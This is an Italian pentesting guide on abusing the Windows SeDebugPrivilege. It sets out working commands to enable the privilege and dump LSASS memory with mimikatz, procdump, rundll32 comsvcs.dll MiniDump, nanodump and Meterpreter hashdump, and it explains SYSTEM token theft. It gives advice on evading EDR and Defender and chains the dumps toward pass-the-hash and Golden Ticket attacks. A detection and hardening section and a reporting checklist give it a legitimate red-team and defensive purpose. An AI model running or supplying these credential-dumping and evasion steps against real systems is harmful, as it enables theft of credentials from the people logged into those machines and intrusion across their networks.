---
title: 'SeDebugPrivilege: LSASS Dump, LOLBins e Privilege Escalation'
slug: sedebugprivilege
description: 'Guida a SeDebugPrivilege su Windows: verifica il token, LSASS dump, comsvcs.dll, credenziali NTLM, PPL, Credential Guard e tecniche di detection e hardening.'
image: /sedebugprivilege-windows-privilege-escalation-pentesting.webp
draft: false
date: 2026-06-02T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - SeDebugPrivilege
  - comsvcs-dll
  - lsass-dump
  - Credential Dumping
  - Windows Privilege Escalation
featured: true
---

# SeDebugPrivilege: da Admin Locale a SYSTEM via LSASS

**SeDebugPrivilege** — chiamato anche **SeDebug privilege** nelle versioni tradotte della documentazione Microsoft — è un privilegio Windows che permette di aprire un handle con accesso completo a *qualsiasi* processo sul sistema, inclusi `lsass.exe` e ogni processo SYSTEM, bypassando i normali controlli DACL sugli handle di processo e thread. In pratica chi lo detiene può leggere/scrivere la memoria di ogni altro processo, debuggarlo o terminarlo, a prescindere da chi ne sia il proprietario.

È assegnato di default agli Administrators locali, ma con una caratteristica che non va data per scontata: compare in `whoami /priv` come presente ma **disabilitato** di default. Va attivato esplicitamente nel token — questo spiega perché mimikatz ha un comando dedicato solo per "accenderlo" prima di qualunque altra operazione.

Il bersaglio principale è `lsass.exe`: il processo che tiene in memoria hash NTLM, chiavi Kerberos, e in certi ambienti password in chiaro. Con accesso completo a quel processo si apre l'intera catena — credential dumping, pass-the-hash, movimento laterale. È uno dei passi post-escalation più sfruttati in pentesting di [privilege escalation su Windows](/articoli/privilege-escalation-windows/), e spesso il primo controllo da fare dopo aver ottenuto una shell admin elevata.

***

## Discovery: verifica il privilegio

```
whoami /priv
```

Cerca `SeDebugPrivilege` nella colonna `Privilege Name`. Quello che conta è la colonna `State`:

```
Privilege Name               Description              State
============================ ======================== ========
SeDebugPrivilege             Debug programs           Disabled
```

`Disabled` non significa "non disponibile" — il token ce l'ha assegnato ma non è attivo nella sessione corrente. Va abilitato prima di poterlo sfruttare.

Se `SeDebugPrivilege` è **completamente assente** dall'output, stai girando in un token filtrato da UAC. Un account amministratore in sessione non elevata ha un token "split": il privilegio viene rimosso dal token filtrato anche se l'utente è nel gruppo Administrators. Serve il prompt UAC o un bypass UAC prima di procedere — ricerca nel contesto della guida generale su [privilege escalation su Windows](/articoli/privilege-escalation-windows/) le tecniche di bypass UAC disponibili in base alla versione target.

**"seDebugPrivilege access is denied"** — se ricevi questo errore tentando di usare il privilegio con un tool, la causa quasi sempre è questa: token non elevato, privilegio assente o disabilitato, o sessione non interattiva senza i diritti sufficienti per `AdjustTokenPrivileges`.

***

## Attivare il privilegio

Con [mimikatz](/articoli/mimikatz/), è un singolo comando prima di qualunque altra operazione:

```
mimikatz # privilege::debug
Privilege '20' OK
```

Se risponde `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (1300)`, il processo corrente non ha il privilegio assegnato nel token — serve un contesto diverso.

In uno script PowerShell o C# personalizzato, l'equivalente è una chiamata a `AdjustTokenPrivileges` sul token del processo corrente per impostare `SE_PRIVILEGE_ENABLED` sul privilegio 20 (`SeDebugPrivilege`). È esattamente quello che fa mimikatz internamente, e quello che deve fare qualunque tool scritto da zero prima di aprire un handle su `lsass.exe`.

***

## Dump di LSASS — le credenziali di tutti gli utenti loggati

Una volta attivo il privilegio, il percorso classico è estrarre la memoria di `lsass.exe` e analizzarla. Il processo contiene materiale di autenticazione distinto: hash NTLM (sempre presenti), chiavi di sessione Kerberos (sempre presenti), e password in chiaro solo se WDigest è attivo (disabilitato di default da Windows 8.1 in poi). Vedi la guida al [credential dumping](/articoli/credential-dumping/) per l'analisi completa dei tipi di materiale estraibile.

### Mimikatz in memoria

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Estrae tutto in un solo passaggio. È il metodo più rumoroso: mimikatz è ampiamente firmato da AV/EDR moderni, quindi su un target con detection attiva raramente arriva in fondo.

### Dump offline — procdump + analisi separata

Separare l'acquisizione dall'analisi riduce il rumore sul target. Il dump avviene con uno strumento meno sospetto, l'analisi offline su macchina controllata:

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

Poi su macchina attaccante:

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Su Linux, stessa operazione senza VM Windows:

```bash
python3 -m pypykatz lsa minidump lsass.dmp
```

### LOLBin comsvcs.dll — zero binari esterni

`comsvcs.dll` è già presente su ogni Windows da Vista in poi e firmata Microsoft. Nessun binario di terze parti da caricare sul target — vedi la guida ai [LOLBins](/articoli/lolbins/) per altri eseguibili nativi usabili in modo simile:

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID_lsass> C:\temp\lsass.dmp full
```

Nessun output visibile se va a buon fine — il file viene creato silenziosamente. Recupera il PID con `tasklist | findstr lsass` prima di eseguire.

Resta comunque un `OpenProcess` con accesso ampio su `lsass.exe`: un EDR con detection comportamentale può segnalarlo anche senza firma del tool.

### Nanodump — direct syscalls, evasione EDR

Bypassa gli hook userland degli EDR usando syscall dirette (`NtReadVirtualMemory`) invece delle API Win32 monitorate. Più evasivo di comsvcs.dll e ProcDump su EDR con hook in userland:

```
nanodump.exe --write C:\temp\lsass.dmp
```

Con `--fork` crea un processo clone di lsass prima del dump, riducendo le anomalie comportamentali rilevate dagli EDR che monitorano `OpenProcess` diretto su lsass:

```
nanodump.exe --fork --write C:\temp\lsass.dmp
```

Con `--valid` produce un dump con header valido, pronto per mimikatz senza preprocessing:

```
nanodump.exe --write C:\temp\lsass.dmp --valid
```

### sekurlsa::credman — Credential Manager dalla memoria

Estrae le password salvate nel Windows Credential Manager — credenziali RDP, share SMB, applicazioni che usano l'API Windows Credential:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

Utile quando `logonpasswords` non restituisce hash riutilizzabili ma il Credential Manager dell'utente contiene credenziali di altri sistemi in chiaro.

### Meterpreter — migrate verso processo SYSTEM

Se sei in una sessione Meterpreter, `migrate` usa internamente `OpenProcess(PROCESS_ALL_ACCESS)` con SeDebugPrivilege sul processo target:

```
meterpreter > ps
meterpreter > migrate 756
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
```

Questo approccio non richiede tool aggiuntivi sul target oltre il payload Meterpreter già attivo.

### Task Manager — GUI dump

Da un desktop interattivo: Task Manager → scheda Dettagli → tasto destro su `lsass.exe` → *Crea file di dump*. Produce lo stesso minidump analizzabile offline con mimikatz o pypykatz. Meno probabile da far scattare alert comportamentali perché è un'azione GUI che un amministratore può compiere per debug legittimo — ma richiede una sessione desktop interattiva.

***

## Tabella di scelta del metodo

| Metodo               | Tool esterni    | File su disco | Detection tipica |
| -------------------- | --------------- | ------------- | ---------------- |
| comsvcs.dll MiniDump | No              | Sì            | Media            |
| Mimikatz diretto     | Sì              | No            | Alta             |
| ProcDump             | Sì (MS firmato) | Sì            | Media-Alta       |
| Nanodump             | Sì              | Sì            | Bassa-Media      |
| Task Manager         | No              | Sì            | Bassa            |

Parti da comsvcs.dll — nessun binario da caricare. Se l'EDR lo flagga per pattern comportamentale, passa a nanodump con `--fork`.

***

## Errori comuni

**`Disabled` in `whoami /priv` — il dump fallisce.**
Token non elevato (UAC split). Avvia un processo elevato o bypassa UAC prima. comsvcs.dll richiede token elevato con il privilegio abilitato.

**comsvcs.dll produce file da 0 byte.**
RunAsPPL attivo. Verifica:

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL
```

Se il valore è presente e diverso da 0, serve BYOVD — vedi la sezione PPL sotto.

**pypykatz mostra hash vuoti o solo NTLM senza password in chiaro.**
WDigest disabilitato (default da Windows 8.1+). Gli hash NTLM ci sono comunque — sufficienti per Pass-the-Hash. I ticket Kerberos permettono Pass-the-Ticket. Cleartext solo in ambienti legacy con WDigest forzato a `UseLogonCredential = 1`.

**EDR blocca comsvcs.dll verso lsass.**
Pattern `rundll32 → comsvcs → lsass PID` documentato nella maggior parte degli EDR. Prova nanodump con `--fork` (direct syscalls, nessun hook userland) o implementa `MiniDumpWriteDump` via P/Invoke custom in PowerShell — stessa funzione, nessun `rundll32`.

**ProcDump bloccato da Defender.**
Defender flagga ProcDump verso lsass anche se firmato Microsoft. Usa nanodump o un tool custom.

***

## Furto diretto del token SYSTEM — senza toccare LSASS

Dumpare LSASS non è l'unica via. Con SeDebugPrivilege puoi aprire un handle su *qualunque* processo SYSTEM (`winlogon.exe`, `services.exe`), duplicarne il token primario con `DuplicateTokenEx`, e usarlo per avviare un nuovo processo con `CreateProcessWithTokenW` — ottenendo una shell SYSTEM senza mai leggere credenziali da LSASS.

È la tecnica dietro `getsystem` di Metasploit (una delle sue varianti) e dietro diversi tool C#/PowerShell di "token stealing" che fanno esattamente questi tre passi: `OpenProcess` su un processo SYSTEM → `OpenProcessToken` + `DuplicateTokenEx` → `CreateProcessWithTokenW` per lanciare `cmd.exe` con quel token.

Operativamente è preferibile al dump di LSASS quando l'obiettivo è solo esecuzione come SYSTEM sulla macchina locale, non esfiltrare credenziali riutilizzabili altrove: niente file di dump su disco, niente accesso massivo alla memoria di LSASS che un EDR può correlare a [credential dumping](/articoli/credential-dumping/).

La differenza chiave rispetto a [SeImpersonatePrivilege](/articoli/seimpersonateprivilege/): quest'ultimo permette di impersonare il token di un *client* dopo un'operazione autorizzata (meccanismo alla base degli attacchi Potato), mentre SeDebugPrivilege permette di aprire direttamente handle su processi altrui. Percorsi distinti, prerequisiti distinti.

***

## Protected Process Light — perché su molti target il dump standard fallisce

Da Windows 8.1 / Server 2012 R2, `lsass.exe` può girare come **Protected Process Light (PPL)**, attivabile via registro. Con PPL attivo, un `OpenProcess` da un processo non protetto — anche con SeDebugPrivilege abilitato — non ottiene un handle con accesso sufficiente per leggere la memoria.

Verifica lo stato prima di scegliere il metodo:

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

Il valore non è solo 0/1: su Windows 11 22H2 e Server 2025 esiste anche il valore `2` (protezione senza UEFI lock, meno stringente). Il valore `1` indica protezione con blocco UEFI — più difficile da disabilitare senza riavvio. Su Windows 7 e versioni precedenti, PPL non esiste: comsvcs.dll funziona sempre con un token elevato senza verifiche ulteriori.

Controlla anche il Visualizzatore eventi (Registri Windows → Sistema, sorgente WinInit, Event ID 12) per confermare che lsass sia effettivamente avviato come processo protetto — il valore di registro da solo non è sempre determinante su tutte le versioni.

Se PPL è attivo, i metodi diretti falliscono. Le vie di bypass richiedono caricare un driver firmato vulnerabile (BYOVD) — mimikatz ha `mimidrv.sys`, strumenti come PPLdump/PPLBlade usano driver diversi. È un'escalation di rumore e richiede privilegi aggiuntivi per il caricamento del driver: vedi la guida a [SeLoadDriverPrivilege](/articoli/seloaddriverprivilege/) per il percorso BYOVD completo.

***

## Credential Guard — le credenziali che nessun bypass su lsass recupera

Se il target ha **Credential Guard** (Virtualization-Based Security) attivo, le credenziali derivate non vivono nel processo `lsass.exe` normale ma in `LsaIso.exe`, isolato tramite virtualizzazione hardware fuori dalla portata del sistema operativo "normale".

**Cosa protegge:** materiale di autenticazione derivato da NTLM e Kerberos per gli account coperti.

**Cosa NON protegge:** account locali non coperti, credenziali in certi flussi di autenticazione specifici, Credential Manager (`sekurlsa::credman` può ancora restituire credenziali salvate), e qualunque attività di keylogging in-session. Un dump di lsass contro un sistema con Credential Guard non è necessariamente vuoto — distingui il materiale protetto da quello che non lo è prima di concludere che il target è immune.

Verifica presenza:

```powershell
Get-ComputerInfo | Select-Object -ExpandProperty DeviceGuardSecurityServicesRunning
```

o da `msinfo32` → campo "Virtualization-based security".

Se Credential Guard è attivo e copre gli account che ti interessano, il percorso alternativo è [SeBackupPrivilege](/articoli/sebackupprivilege/) per dump via filesystem (NTDS.dit + SYSTEM hive) che non tocca la memoria di lsass — o il furto diretto del token SYSTEM descritto sopra, che non necessita di credenziali.

***

## Scenari reali

**Admin locale su workstation con domain admin in sessione RDS.**
Token elevato → comsvcs.dll dump → pypykatz offline → hash NTLM domain admin → Pass-the-Hash → DC → secretsdump → Golden Ticket. Scenario classico del salto da workstation a DC.

**Post-escalation su server applicativo.**
Appena ottenuto admin via altro vettore → dump silenzioso con Task Manager (sessione desktop interattiva) → credenziali di service account AD in memoria → movimento laterale verso altri server nella stessa subnet.

**Developer machine senza EDR.**
Gli sviluppatori loggano con credenziali AD, SeDebugPrivilege disponibile, nessun EDR comportamentale → mimikatz diretto → hash e ticket → PTH sull'infrastruttura interna. Frequente in ambienti dove le workstation di sviluppo sono meno protette dei server.

**"SeDebugPrivilege Windows 7" — target legacy.**
Su Windows 7 non esiste PPL né Credential Guard: comsvcs.dll funziona senza eccezioni con qualunque token elevato. WDigest è attivo di default → password in chiaro in memoria → la situazione offensiva è più favorevole rispetto ai target moderni.

***

## Workflow operativo

**Step 1 — Verifica il privilegio.** `whoami /priv`, controlla la colonna `State` per `SeDebugPrivilege`. Assente dal token → serve elevazione o altro vettore di privesc.

**Step 2 — Controlla le protezioni.** `RunAsPPL` su LSASS (reg query) e Credential Guard (Get-ComputerInfo) — determinano quale tecnica ha senso, prima di perdere tempo su un dump che fallirà.

**Step 3 — Definisci l'obiettivo.** Credenziali riutilizzabili per movimento laterale → dump LSASS. Solo esecuzione SYSTEM in locale → furto diretto del token, più silenzioso e senza file su disco.

**Step 4 — Scegli il metodo.** comsvcs.dll come default (zero tool), nanodump se l'EDR lo blocca, Task Manager se hai desktop interattivo e vuoi il minimo rumore.

**Step 5 — Se PPL blocca l'accesso diretto**, valuta BYOVD solo se l'engagement lo giustifica — è un'escalation di rumore e va documentata come passaggio distinto nel report.

***

## Detection e hardening

| Cosa rileva il Blue Team                                         | Come lo bypassa il Red Team                                                       |
| ---------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| Sysmon Event ID 10 — `ProcessAccess` su lsass                    | `nanodump --fork` — crea processo intermedio prima di accedere alla memoria       |
| Pattern `rundll32 → comsvcs → lsass PID`                         | `MiniDumpWriteDump` via P/Invoke in PowerShell — stessa funzione, nessun rundll32 |
| ProcDump verso lsass — flaggato da Defender                      | Nanodump con direct syscalls, o tool custom non firmato                           |
| Sysmon Event ID 11 — creazione file `*.dmp` da processo sospetto | Dump in percorso non monitorato, poi exfil immediato                              |
| Defender behavioral — dump lsass da tool noto                    | `execute-assembly` da Cobalt Strike/Sliver — in-memory, no file su disco          |

**Hardening:**

* `RunAsPPL = 1` nella chiave LSA — blocca i dump diretti con SeDebugPrivilege, costringe verso BYOVD molto più rumoroso.
* **Credential Guard** dove l'hardware lo supporta — isola le credenziali derivate con virtualizzazione.
* **Regola ASR Microsoft Defender** "Block credential stealing from Windows local security authority subsystem" — utile quando PPL e Credential Guard non sono disponibili; quando PPL è già attivo, non aggiunge protezione equivalente.
* Alert su `rundll32.exe` che carica `comsvcs.dll` con argomento `MiniDump` — pattern specifico e raramente legittimo.
* Monitora Sysmon Event ID 10 + Event ID 11 in correlazione: accesso a lsass seguito da creazione di un file dump è il pattern da allertare, non solo il singolo evento.
* Limita il numero di account con privilegi amministrativi locali — la vera difesa, perché SeDebugPrivilege è assegnato di default a chiunque sia in Administrators.
* Disabilita WDigest (`UseLogonCredential = 0`) se non già fatto — rimuove le password in chiaro dalla memoria di lsass.

***

## Checklist SeDebugPrivilege

**Discovery**

* `whoami /priv` eseguito, stato di `SeDebugPrivilege` verificato (presente/assente, enabled/disabled)
* Se assente: causa identificata (sessione non elevata, token UAC filtrato) prima di procedere

**Protezioni a monte**

* Stato di `RunAsPPL` verificato (valore 0, 1 o 2) prima di scegliere il metodo di dump
* Presenza di Credential Guard verificata se rilevante per l'obiettivo
* Event ID 12 di WinInit controllato per confermare lo stato PPL effettivo su sistemi recenti

**Esecuzione**

* Metodo scelto in base al rumore tollerato e al livello di detection del target
* Per dump offline: fase di estrazione separata dalla fase di analisi, dump portato fuori dal target prima di processarlo
* Per furto token: verificato che il processo SYSTEM scelto sia effettivamente aperto con successo prima di procedere alla duplicazione

**Reporting**

* Tecnica usata documentata con il suo livello di rumore/rilevabilità atteso
* Tipo di materiale ottenuto specificato: hash NTLM, ticket Kerberos, password in chiaro, credenziali Credential Manager — non assumere per default
* Eventuali bypass PPL via driver segnalati come passaggio distinto, con il privilegio locale richiesto esplicitato
* Impatto riportato in base a cosa è stato effettivamente estratto, non stimato a priori

***

## FAQ

**Cos'è SeDebugPrivilege in parole semplici?**
È il permesso Windows che consente di aprire con accesso completo qualunque altro processo sul sistema, bypassando i controlli DACL normali. In pratica la chiave per leggere la memoria di `lsass.exe` e accedere alle credenziali di tutti gli utenti in sessione.

**Chi ha SeDebugPrivilege di default?**
Gli Administrators locali. Compare nel token come disabilitato finché non viene attivato esplicitamente. In una sessione non elevata (UAC), il token filtrato lo rimuove del tutto — serve elevazione prima.

**SeDebugPrivilege equivale automaticamente a una shell SYSTEM?**
No — sono tre risultati distinti con prerequisiti diversi. Il privilegio consente di aprire handle su processi altrui. L'accesso a LSASS dipende anche dallo stato di PPL. Ottenere una shell SYSTEM richiede o il furto diretto del token (OpenProcess → DuplicateTokenEx → CreateProcessWithTokenW) o credenziali da usare per movimento laterale. Nessuno dei tre è garantito automaticamente dall'altro.

**SeDebugPrivilege funziona anche con Windows Defender attivo?**
Il privilegio in sé non viene bloccato da Defender, ma le azioni che ne derivano — `sekurlsa::logonpasswords` di mimikatz in particolare — sono ampiamente rilevate per firma. Varianti più silenziose (comsvcs.dll, Task Manager, nanodump) hanno probabilità di rilevamento diverse, mai nulle con un EDR comportamentale moderno.

**Qual è la differenza tra SeDebugPrivilege e SeImpersonatePrivilege?**
`SeDebugPrivilege` dà accesso diretto alla memoria di altri processi (percorso verso LSASS e token stealing). [SeImpersonatePrivilege](/articoli/seimpersonateprivilege/) permette di impersonare il token di un client dopo un'operazione di impersonazione autorizzata — meccanismo alla base degli attacchi Potato. Due privilegi distinti, tecniche e prerequisiti completamente diversi, entrambi portano a SYSTEM ma per strade diverse.

**WDigest è disabilitato — ottengo comunque qualcosa?**
Sì. Gli hash NTLM sono sempre presenti nel dump (Pass-the-Hash), i ticket Kerberos per Pass-the-Ticket, e il Credential Manager può contenere password in chiaro di altri sistemi recuperabili con `sekurlsa::credman`. La mancanza di cleartext non svuota il dump.

**Credential Guard blocca tutto?**
Blocca il materiale di autenticazione derivato degli account protetti da VBS. Non protegge account locali, credenziali salvate nel Credential Manager, tutti i flussi di autenticazione, né le attività in sessione. Un dump contro un sistema con Credential Guard non è necessariamente inutile — dipende da quali account sono in memoria e quali sono coperti dalla protezione.

***

Vedi anche: [SeImpersonatePrivilege](/articoli/seimpersonateprivilege/), [SeBackupPrivilege](/articoli/sebackupprivilege/), [Mimikatz](/articoli/mimikatz/), [Credential Dumping](/articoli/credential-dumping/), [LOLBins](/articoli/lolbins/), [SeLoadDriverPrivilege](/articoli/seloaddriverprivilege/), [Privilege Escalation Windows](/articoli/privilege-escalation-windows/).

Riferimenti: [Microsoft Learn — Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) · [Microsoft Learn — LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) · [MITRE ATT\&CK T1003.001](https://attack.mitre.org/techniques/T1003/001/) · [Nanodump](https://github.com/helpsystems/nanodump) · [Mimikatz](https://github.com/gentilkiwi/mimikatz)
